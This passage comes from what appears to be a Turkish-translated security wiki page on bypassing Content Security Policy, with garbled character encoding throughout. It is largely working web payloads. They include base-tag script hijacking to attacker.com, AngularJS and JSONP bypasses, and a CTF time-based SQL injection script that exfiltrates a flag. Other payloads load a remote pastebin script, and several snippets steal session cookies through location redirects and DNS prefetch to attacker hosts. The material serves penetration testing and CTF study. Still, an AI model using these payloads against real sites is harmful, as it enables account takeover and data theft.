Bu, tarayÄ±cÄ± iÃ§in, `https://example.com/scripts/react/` altÄ±nda bulunan `..%2fangular%2fangular.js` adlÄ± bir dosyayÄ± yÃ¼klediÄŸiniz anlamÄ±na gelir ve bu, CSP'ye uygundur.

SonuÃ§ olarak, tarayÄ±cÄ± bunu Ã§Ã¶zecek ve etkili bir ÅŸekilde `https://example.com/scripts/react/../angular/angular.js` adresini isteyecektir, bu da `https://example.com/scripts/angular/angular.js` ile eÅŸdeÄŸerdir.

**TarayÄ±cÄ± ve sunucu arasÄ±ndaki URL yorumlama tutarsÄ±zlÄ±ÄŸÄ±nÄ± sÃ¶mÃ¼rerek, yol kurallarÄ± atlatÄ±labilir**.

Ã‡Ã¶zÃ¼m, sunucu tarafÄ±nda `%2f`'yi `/` olarak iÅŸlememektir, bÃ¶ylece tarayÄ±cÄ± ve sunucu arasÄ±nda tutarlÄ± yorumlama saÄŸlanarak bu sorundan kaÃ§Ä±nÄ±lÄ±r.

Ã‡evrimiÃ§i Ã–rnek: [https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

#### Ä°frame'lerde JS yÃ¼rÃ¼tme

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

#### eksik **base-uri**

EÄŸer **base-uri** yÃ¶nergesi eksikse, bunu kÃ¶tÃ¼ye kullanarak [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) gerÃ§ekleÅŸtirebilirsiniz.

AyrÄ±ca, **sayfa bir Nonce kullanarak bir gÃ¶reli yol** (Ã¶rneÄŸin `<script src="/js/app.js">`) kullanarak bir betik yÃ¼klÃ¼yorsa, **base** **tag**'Ä±nÄ± kÃ¶tÃ¼ye kullanarak **kendi sunucunuzdan betiÄŸi yÃ¼klemesini saÄŸlayabilir ve XSS saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilirsiniz.**\
EÄŸer zafiyetli sayfa **httpS** ile yÃ¼kleniyorsa, base'de bir httpS URL kullanÄ±n.

```html
<base href="https://www.attacker.com/">
```

#### AngularJS olaylarÄ±

Belirli bir politika olan Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP), JavaScript olaylarÄ±nÄ± kÄ±sÄ±tlayabilir. Bununla birlikte, AngularJS, alternatif olarak Ã¶zel olaylar tanÄ±tÄ±r. Bir olay iÃ§inde, AngularJS, tarayÄ±cÄ±daki olay nesnesine referans olan benzersiz bir `$event` nesnesi saÄŸlar. Bu `$event` nesnesi, CSP'yi atlatmak iÃ§in kullanÄ±labilir. Ã–zellikle, Chrome'da, `$event/event` nesnesi, olayÄ±n yÃ¼rÃ¼tme zincirinde yer alan bir nesne dizisini tutan `path` Ã¶zniteliÄŸine sahiptir ve bu dizide `window` nesnesi her zaman en sonda yer alÄ±r. Bu yapÄ±, kum havuzu kaÃ§Ä±ÅŸ taktikleri iÃ§in Ã¶nemlidir.

Bu diziyi `orderBy` filtresine yÃ¶nlendirerek, onun Ã¼zerinde yineleme yapmak ve terminal Ã¶ÄŸeyi ( `window` nesnesi) kullanarak `alert()` gibi bir genel iÅŸlevi tetiklemek mÃ¼mkÃ¼ndÃ¼r. AÅŸaÄŸÄ±daki gÃ¶sterilen kod parÃ§acÄ±ÄŸÄ±, bu sÃ¼reci aÃ§Ä±klar:

```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Bu parÃ§a, olayÄ± tetiklemek iÃ§in `ng-focus` yÃ¶nergesinin kullanÄ±mÄ±nÄ± vurgular, `path` dizisini manipÃ¼le etmek iÃ§in `$event.path|orderBy`'yi kullanÄ±r ve `alert()` iÅŸlevini yÃ¼rÃ¼tmek iÃ§in `window` nesnesini kullanarak `document.cookie`'yi ortaya Ã§Ä±karÄ±r.

**DiÄŸer Angular bypasslarÄ±nÄ±** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **adresinde bulabilirsiniz**

#### AngularJS ve izin verilen alan adÄ±

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```

Bir Angular JS uygulamasÄ±nda betik yÃ¼kleme iÃ§in alan adlarÄ±nÄ± beyaz listeye alan bir CSP politikasÄ±, geri Ã§aÄŸrÄ± iÅŸlevlerinin Ã§aÄŸrÄ±lmasÄ± ve belirli gÃ¼venlik aÃ§Ä±klarÄ±na sahip sÄ±nÄ±flar aracÄ±lÄ±ÄŸÄ±yla atlatÄ±labilir. Bu teknik hakkÄ±nda daha fazla bilgi, bu [git deposunda](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) bulunan detaylÄ± kÄ±lavuzda mevcuttur.

Ã‡alÄ±ÅŸan yÃ¼kler:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

#### YÃ¶nlendirme AracÄ±lÄ±ÄŸÄ±yla Atlatma

CSP yÃ¶nlendirme ile karÅŸÄ±laÅŸtÄ±ÄŸÄ±nda ne olur? EÄŸer yÃ¶nlendirme, izin verilmeyen farklÄ± bir kÃ¶kene yol aÃ§arsa, hala baÅŸarÄ±sÄ±z olacaktÄ±r.

Ancak, [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) iÃ§indeki aÃ§Ä±klamaya gÃ¶re, eÄŸer yÃ¶nlendirme farklÄ± bir yola yol aÃ§arsa, orijinal kÄ±sÄ±tlamalarÄ± atlayabilir.

Ä°ÅŸte bir Ã¶rnek:

```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```

EÄŸer CSP `https://www.google.com/a/b/c/d` olarak ayarlanmÄ±ÅŸsa, yolun dikkate alÄ±ndÄ±ÄŸÄ±ndan dolayÄ± hem `/test` hem de `/a/test` betikleri CSP tarafÄ±ndan engellenecektir.

Ancak, son `http://localhost:5555/301` **sunucu tarafÄ±nda `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`'e yÃ¶nlendirilecektir**. YÃ¶nlendirme olduÄŸundan, **yol dikkate alÄ±nmaz** ve **betik yÃ¼klenebilir**, bÃ¶ylece yol kÄ±sÄ±tlamasÄ± atlatÄ±lmÄ±ÅŸ olur.

Bu yÃ¶nlendirme ile, yol tamamen belirtilmiÅŸ olsa bile, yine atlatÄ±lacaktÄ±r.

Bu nedenle, en iyi Ã§Ã¶zÃ¼m, web sitesinin aÃ§Ä±k yÃ¶nlendirme aÃ§Ä±klarÄ±nÄ±n olmadÄ±ÄŸÄ±ndan ve CSP kurallarÄ±nda istismar edilebilecek alan adlarÄ±nÄ±n olmadÄ±ÄŸÄ±ndan emin olmaktÄ±r.

#### Dangling markup ile CSP'yi atlatÄ±n

[buradan nasÄ±l yapÄ±lacaÄŸÄ±nÄ± okuyun](../dangling-markup-html-scriptless-injection/).

#### 'unsafe-inline'; img-src \*; XSS aracÄ±lÄ±ÄŸÄ±yla

```
default-src 'self' 'unsafe-inline'; img-src *;
```

`'unsafe-inline'` demek ki kodun iÃ§inde herhangi bir scripti Ã§alÄ±ÅŸtÄ±rabilirsiniz (XSS kodu Ã§alÄ±ÅŸtÄ±rabilir) ve `img-src *` demek ki web sayfasÄ±nda herhangi bir kaynaktan herhangi bir resmi kullanabilirsiniz.

Bu CSP'yi resimler aracÄ±lÄ±ÄŸÄ±yla veri sÄ±zdÄ±rarak atlayabilirsiniz (bu durumda XSS, bir bot tarafÄ±ndan eriÅŸilebilen bir sayfada bir SQLi iÃ§eren bir CSRF'yi kÃ¶tÃ¼ye kullanÄ±r ve bayraÄŸÄ± bir resim aracÄ±lÄ±ÄŸÄ±yla Ã§Ä±karÄ±r):

```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Bu yapÄ±landÄ±rmayÄ± **bir resmin iÃ§ine yerleÅŸtirilmiÅŸ javascript kodunu yÃ¼klemek** iÃ§in de kÃ¶tÃ¼ye kullanabilirsiniz. Ã–rneÄŸin, sayfa Twitter'dan resim yÃ¼kleme izni veriyorsa, **Ã¶zel bir resim oluÅŸturabilir**, bunu Twitter'a yÃ¼kleyebilir ve "**unsafe-inline**"i kÃ¶tÃ¼ye kullanarak bir JS kodunu (normal bir XSS olarak) **Ã§alÄ±ÅŸtÄ±rabilirsiniz**. Bu JS kodu **resmi yÃ¼kleyecek**, ondan JS'yi **Ã§Ä±karacak** ve **Ã§alÄ±ÅŸtÄ±racaktÄ±r**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

#### Servis Ä°ÅŸÃ§ileriyle

Servis iÅŸÃ§ilerinin **`importScripts`** fonksiyonu CSP tarafÄ±ndan sÄ±nÄ±rlÄ± deÄŸildir:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

#### Politika Enjeksiyonu

**AraÅŸtÄ±rma:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

**Chrome**

EÄŸer sizin tarafÄ±nÄ±zdan gÃ¶nderilen bir **parametre**, **politikanÄ±n deklarasyonu iÃ§ine yapÄ±ÅŸtÄ±rÄ±lÄ±yorsa**, o zaman politikayÄ± **kullanÄ±ÅŸsÄ±z hale getirecek ÅŸekilde** deÄŸiÅŸtirebilirsiniz. Bu bypasslardan herhangi biriyle **script 'unsafe-inline'**'Ä± **izin verebilirsiniz**:

```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Bu direktif **mevcut script-src direktiflerini Ã¼zerine yazar**.\
Bir Ã¶rnek ÅŸurada bulunabilir: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

**Edge**

Edge'de Ã§ok daha basittir. EÄŸer CSP'ye sadece bunu ekleyebilirseniz: **`;_`** **Edge**, **tÃ¼m politikayÄ± dÃ¼ÅŸÃ¼recektir**.\
Ã–rnek: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

#### img-src \*; XSS aracÄ±lÄ±ÄŸÄ±yla (iframe) - Zaman saldÄ±rÄ±sÄ±

`'unsafe-inline'` direktifinin eksik olduÄŸuna dikkat edin.\
Bu sefer kurbanÄ± **XSS** aracÄ±lÄ±ÄŸÄ±yla **kontrolÃ¼nÃ¼zdeki bir sayfayÄ± yÃ¼klemesini saÄŸlayabilirsiniz** `<iframe` ile. Bu sefer kurbanÄ± istediÄŸiniz yerden bilgi Ã§Ä±karmak iÃ§in eriÅŸmeye zorlayacaksÄ±nÄ±z (**CSRF**). SayfanÄ±n iÃ§eriÄŸine eriÅŸemezsiniz, ancak sayfanÄ±n yÃ¼klenmesi iÃ§in gereken sÃ¼reyi bir ÅŸekilde **kontrol edebilirseniz**, ihtiyacÄ±nÄ±z olan bilgileri Ã§Ä±karabilirsiniz.

Bu sefer bir **bayrak** Ã§Ä±karÄ±lacak, her bir **karakter doÄŸru tahmin edildiÄŸinde** SQLi aracÄ±lÄ±ÄŸÄ±yla **yanÄ±tÄ±n** sleep fonksiyonundan dolayÄ± **daha uzun sÃ¼rmesi** nedeniyle bayraÄŸÄ± Ã§Ä±karabileceksiniz:

```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```

#### Yer Ä°ÅŸaretÃ§ileri AracÄ±lÄ±ÄŸÄ±yla

Bu saldÄ±rÄ±, saldÄ±rganÄ±n kullanÄ±cÄ±yÄ± tarayÄ±cÄ±nÄ±n yer iÅŸaretÃ§isi Ã¼zerine bir baÄŸlantÄ±yÄ± sÃ¼rÃ¼kleyip bÄ±rakmaya ikna ettiÄŸi bir sosyal mÃ¼hendislik gerektirir. Bu yer iÅŸaretÃ§isi, **zararlÄ± javascript** kodunu iÃ§erecektir ve sÃ¼rÃ¼klendiÄŸinde veya tÄ±klandÄ±ÄŸÄ±nda mevcut web penceresinin baÄŸlamÄ±nda **Ã§alÄ±ÅŸtÄ±rÄ±lacak, CSP'yi atlayacak ve Ã§erezler veya tokenlar gibi hassas bilgileri Ã§almaya izin verecektir**.

Daha fazla bilgi iÃ§in [**buradaki orijinal rapora bakÄ±n**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

#### CSP kÄ±sÄ±tlayarak CSP atlatma

Bu [**CTF Ã§Ã¶zÃ¼mÃ¼nde**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), bir izin verilen iframe iÃ§ine daha kÄ±sÄ±tlayÄ±cÄ± bir CSP enjekte edilerek CSP atlatÄ±lÄ±r ve belirli bir JS dosyasÄ±nÄ±n yÃ¼klenmesine izin verilmez, ardÄ±ndan **prototype kirliliÄŸi** veya **dom clobbering** aracÄ±lÄ±ÄŸÄ±yla farklÄ± bir betiÄŸi kÃ¶tÃ¼ye kullanarak **keyfi bir betik yÃ¼klenmesine izin verilir**.

Bir Iframe'in CSP'sini **`csp`** Ã¶zniteliÄŸi ile **kÄ±sÄ±tlayabilirsiniz**:

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**Bu CTF Ã§Ã¶zÃ¼mÃ¼nde**](https://github.com/aszx87410/ctf-writeups/issues/48), **HTML enjeksiyonu** aracÄ±lÄ±ÄŸÄ±yla **CSP** daha fazla **kÄ±sÄ±tlanarak** CSTI'yi Ã¶nleyen bir betik devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ± ve dolayÄ±sÄ±yla **zafiyet sÃ¶mÃ¼rÃ¼lebilir hale geldi.**\
CSP daha kÄ±sÄ±tlayÄ±cÄ± hale getirilebilir **HTML meta etiketleri** kullanÄ±larak ve iÃ§ iÃ§e betikler devre dÄ±ÅŸÄ± bÄ±rakÄ±labilir **giriÅŸ**lerini kaldÄ±rarak, **nonce**'larÄ±na izin verilir ve **sha** aracÄ±lÄ±ÄŸÄ±yla belirli iÃ§ iÃ§e betikler etkinleÅŸtirilebilir:

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```

#### Ä°Ã§erik-GÃ¼venlik-PolitikasÄ±-Rapor-YalnÄ±zca ile JS veri sÄ±zdÄ±rma

EÄŸer sunucunun yanÄ±t vermesini saÄŸlayabilirseniz **`Content-Security-Policy-Report-Only`** baÅŸlÄ±ÄŸÄ±yla ve bir **deÄŸeri sizin kontrolÃ¼nÃ¼zde** (belki bir CRLF nedeniyle), sunucunuzu iÅŸaret etmesini saÄŸlayabilir ve eÄŸer sÄ±zdÄ±rmak istediÄŸiniz **JS iÃ§eriÄŸini** **`<script>`** ile **sarmalarsanÄ±z** ve muhtemelen `unsafe-inline`'Ä±n CSP tarafÄ±ndan izin verilmediÄŸi iÃ§in, bu bir CSP hatasÄ± tetikleyecek ve duyarlÄ± bilgileri iÃ§eren betik kÄ±smÄ± sunucuya `Content-Security-Policy-Report-Only` Ã¼zerinden gÃ¶nderilecektir.

Ã–rnek iÃ§in [**bu CTF Ã§Ã¶zÃ¼mÃ¼ne bakÄ±n**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

#### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)

```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```

#### CSP ve Iframe ile Bilgi SÄ±zdÄ±rma

* Ä°zin verilen bir URL'ye (bunu `https://example.redirect.com` olarak adlandÄ±ralÄ±m) iÅŸaret eden bir `iframe` oluÅŸturulur.
* Bu URL daha sonra CSP tarafÄ±ndan **izin verilmeyen** gizli bir URL'ye yÃ¶nlendirir (Ã¶rneÄŸin, `https://usersecret.example2.com`).
* `securitypolicyviolation` etkinliÄŸini dinleyerek, `blockedURI` Ã¶zelliÄŸini yakalayarak engellenen URI'nin alanÄ±nÄ± ortaya Ã§Ä±karabilirsiniz, bu da baÅŸlangÄ±Ã§taki URL'nin yÃ¶nlendiÄŸi gizli alanÄ± sÄ±zdÄ±rÄ±r.

Ä°lginÃ§ olan, Chrome ve Firefox gibi tarayÄ±cÄ±larÄ±n CSP'ye gÃ¶re iframe'leri iÅŸlemede farklÄ± davranÄ±ÅŸlarÄ± olmasÄ±dÄ±r, bu da tanÄ±msÄ±z davranÄ±ÅŸ nedeniyle hassas bilgilerin sÄ±zmasÄ±na yol aÃ§abilir.

BaÅŸka bir teknik, CSP'yi kendisi Ã¼zerinden kullanarak gizli alt alanÄ± Ã§Ä±karmayÄ± iÃ§erir. Bu yÃ¶ntem, bir ikili arama algoritmasÄ±na dayanÄ±r ve CSP'yi belirli alanlarÄ± kasten engelleyen veya izin veren CSP'yi ayarlayarak gizli alt alanÄ± Ã§Ä±karmaya dayanÄ±r. Ã–rneÄŸin, gizli alt alanÄ± bilinmeyen karakterlerden oluÅŸuyorsa, CSP yÃ¶nergesini deÄŸiÅŸtirerek bu alt alanlarÄ± engellemek veya izin vermek iÃ§in CSP'yi deÄŸiÅŸtirerek farklÄ± alt alanlarÄ± iteratif olarak test edebilirsiniz. AÅŸaÄŸÄ±da, bu yÃ¶ntemi kolaylaÅŸtÄ±rmak iÃ§in CSP'nin nasÄ±l yapÄ±landÄ±rÄ±labileceÄŸini gÃ¶steren bir kod parÃ§asÄ± bulunmaktadÄ±r:

```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

CSP tarafÄ±ndan engellenen veya izin verilen istekleri izleyerek, gizli alt alanÄ±ndaki olasÄ± karakterleri daraltabilir ve sonunda tam URL'yi ortaya Ã§Ä±karabilirsiniz.

Her iki yÃ¶ntem de CSP uygulamasÄ±nÄ±n ve tarayÄ±cÄ±lardaki davranÄ±ÅŸÄ±nÄ±n inceliklerinden yararlanÄ±r ve gÃ¶rÃ¼nÃ¼ÅŸte gÃ¼venli politikalarÄ±n hassas bilgileri istemeden sÄ±zdÄ±rabileceÄŸini gÃ¶sterir.

Hile [**buradan**](https://ctftime.org/writeup/29310).

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±lmasÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgilenin

**Bize** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **katÄ±lÄ±n ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!**

### CSP'yi Atlatmak Ä°Ã§in GÃ¼vensiz Teknolojiler

#### PHP yanÄ±t tamponu aÅŸÄ±rÄ± yÃ¼kleme

PHP'nin varsayÄ±lan olarak yanÄ±tÄ± 4096 bayte kadar tamponladÄ±ÄŸÄ± bilinmektedir. Bu nedenle, PHP bir uyarÄ± gÃ¶steriyorsa, yeterli veri saÄŸlayarak uyarÄ±larÄ±n iÃ§ine yeterli veri saÄŸlayarak yanÄ±tÄ±n CSP baÅŸlÄ±ÄŸÄ±ndan Ã¶nce gÃ¶nderilmesine neden olur ve baÅŸlÄ±k gÃ¶rmezden gelinir.\
Sonra, tekniÄŸin temeli temelde yanÄ±t tamponunu uyarÄ±larla doldurmaktÄ±r, bÃ¶ylece CSP baÅŸlÄ±ÄŸÄ± gÃ¶nderilmez.

Fikir [**bu yazÄ±dan**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

#### Hata SayfasÄ±nÄ± Yeniden Yazma

[**Bu yazÄ±dan**](https://blog.ssrf.kr/69) gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re bir CSP korumasÄ±nÄ± atlatmanÄ±n mÃ¼mkÃ¼n olduÄŸu, bir hata sayfasÄ± yÃ¼kleyerek (muhtemelen CSP olmadan) ve iÃ§eriÄŸini yeniden yazarak mÃ¼mkÃ¼n olduÄŸu gÃ¶rÃ¼nÃ¼yor.

```javascript
a = window.open('/' + 'x'.repeat(4100));
setTimeout(function() {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`;
}, 1000);
```

#### SOME + 'self' + wordpress

SOME, bir sayfanÄ±n bir uÃ§ noktasÄ±ndaki XSS'i (veya Ã§ok sÄ±nÄ±rlÄ± XSS'i) **kÃ¶tÃ¼ye kullanarak**, **aynÄ± kÃ¶kten diÄŸer uÃ§ noktalarÄ± kÃ¶tÃ¼ye kullanmak** iÃ§in kullanÄ±lan bir tekniktir. Bu, savunmasÄ±z uÃ§ noktayÄ± saldÄ±rganÄ±n sayfasÄ±ndan yÃ¼kleyerek ve ardÄ±ndan saldÄ±rganÄ±n sayfasÄ±nÄ± kÃ¶tÃ¼ye kullanmak istediÄŸiniz aynÄ± kÃ¶kteki gerÃ§ek uÃ§ noktaya yeniden yÃ¼kleyerek yapÄ±lÄ±r. Bu ÅŸekilde **savunmasÄ±z uÃ§ nokta**, **payload** iÃ§indeki **`opener`** nesnesini kullanarak **kÃ¶tÃ¼ye kullanmak istediÄŸiniz gerÃ§ek uÃ§ noktanÄ±n DOM'una eriÅŸebilir**. Daha fazla bilgi iÃ§in ÅŸuraya bakÄ±n:

{% content-ref url="../xss-cross-site-scripting/some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](../xss-cross-site-scripting/some-same-origin-method-execution.md)
{% endcontent-ref %}

AyrÄ±ca, **wordpress**'in `/wp-json/wp/v2/users/1?_jsonp=data` yolunda **yansÄ±tacak** bir **JSONP** uÃ§ noktasÄ± bulunmaktadÄ±r ve bu uÃ§ nokta, yalnÄ±zca harf, rakam ve noktalarla sÄ±nÄ±rlÄ± olan **gÃ¶nderilen veriyi** yansÄ±tacaktÄ±r.

Bir saldÄ±rgan, bu uÃ§ noktayÄ± kÃ¶tÃ¼ye kullanarak WordPress'e karÅŸÄ± **bir SOME saldÄ±rÄ±sÄ± oluÅŸturabilir** ve bunu `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` iÃ§ine **yerleÅŸtirebilir**. Bu **script**, 'self' tarafÄ±ndan **izin verildiÄŸi iÃ§in yÃ¼klenecektir**. AyrÄ±ca, ve WordPress yÃ¼klÃ¼ olduÄŸundan, bir saldÄ±rgan, **CSP'yi atlatan** **savunmasÄ±z** **geri Ã§aÄŸrÄ±** uÃ§ noktasÄ± aracÄ±lÄ±ÄŸÄ±yla **SOME saldÄ±rÄ±sÄ±nÄ± kÃ¶tÃ¼ye kullanabilir** ve bir kullanÄ±cÄ±ya daha fazla ayrÄ±calÄ±k vermek, yeni bir eklenti yÃ¼klemek gibi iÅŸlemleri gerÃ§ekleÅŸtirebilir...\
Bu saldÄ±rÄ±yÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸiniz hakkÄ±nda daha fazla bilgi iÃ§in [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

### CSP Exfiltration Bypasses

EÄŸer **harici sunucularla etkileÅŸime izin vermeyen sÄ±kÄ± bir CSP** varsa, bilgileri dÄ±ÅŸa aktarmak iÃ§in her zaman yapabileceÄŸiniz bazÄ± ÅŸeyler vardÄ±r.

#### Location

Sadece konumu gÃ¼ncelleyerek gizli bilgileri saldÄ±rganÄ±n sunucusuna gÃ¶nderebilirsiniz:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
document.location = "https://attacker.com/?" + sessionid;
```

#### Meta etiketi

Bir meta etiketi enjekte ederek yÃ¶nlendirebilirsiniz (bu sadece bir yÃ¶nlendirme iÅŸlemidir, iÃ§erik sÄ±zdÄ±rmaz).

```html
<meta http-equiv="refresh" content="1; http://attacker.com">
```

#### DNS Ã–n YÃ¼kleme

SayfalarÄ± daha hÄ±zlÄ± yÃ¼klemek iÃ§in tarayÄ±cÄ±lar, ana bilgisayar adlarÄ±nÄ± IP adreslerine Ã¶nceden Ã§Ã¶zÃ¼mleyip daha sonra kullanmak Ã¼zere Ã¶nbelleÄŸe alÄ±rlar.\
TarayÄ±cÄ±ya bir ana bilgisayar adÄ±nÄ± Ã¶nceden Ã§Ã¶zÃ¼mlemesi iÃ§in ÅŸu ÅŸekilde belirtebilirsiniz: `<link rel="dns-prefetch" href="something.com">`

Bu davranÄ±ÅŸÄ± istismar ederek **DNS istekleri aracÄ±lÄ±ÄŸÄ±yla hassas bilgileri dÄ±ÅŸarÄ± sÄ±zdÄ±rabilirsiniz**:

```javascript
var sessionid = document.cookie.split('=')[1]+".";
var body = document.getElementsByTagName('body')[0];
body.innerHTML = body.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + sessionid + "attacker.ch\">";
```

BaÅŸka bir yol:

```javascript
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

Bu durumun Ã¶nÃ¼ne geÃ§mek iÃ§in sunucu HTTP baÅŸlÄ±ÄŸÄ±nÄ± gÃ¶nderebilir:

```
X-DNS-Prefetch-Control: off
```

{% hint style="info" %}
GÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re, bu teknik baÅŸsÄ±z tarayÄ±cÄ±larda (botlar) Ã§alÄ±ÅŸmÄ±yor.
{% endhint %}

#### WebRTC

